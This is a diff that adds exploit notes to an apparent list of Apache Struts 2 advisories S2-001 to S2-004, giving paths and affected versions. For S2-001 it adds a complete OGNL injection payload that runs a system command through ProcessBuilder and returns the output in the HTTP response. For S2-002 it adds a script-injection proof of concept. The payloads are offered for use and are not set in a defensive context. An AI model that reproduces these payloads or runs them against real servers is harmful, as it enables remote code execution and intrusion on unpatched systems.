@@ -1,9 +1,19 @@
 S2-001 — Remote code exploit on form validation error
-        
+
+	path : login.action (post)
+	Affected : Xwork2 struts 2.0.0 ~ 2.0.8 
+	payload
+	%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
     
 S2-002 — Cross site scripting (XSS) vulnerability on <s:url> and <s:a> tags
-
+	
+	path : $filename.action
+	Affected : Xwork2 Struts 2.0.0 ~ 2.1.8.1
+	PoC : $filename.action/?<script>alert(1)</script>test=hello
+	
 S2-003 — XWork ParameterInterceptors bypass allows OGNL statement execution
+	
+	Affected : Xwork2 Struts 2.0.0 ~ 2.1.8.1
 
 S2-004 — Directory traversal vulnerability while serving static content
 
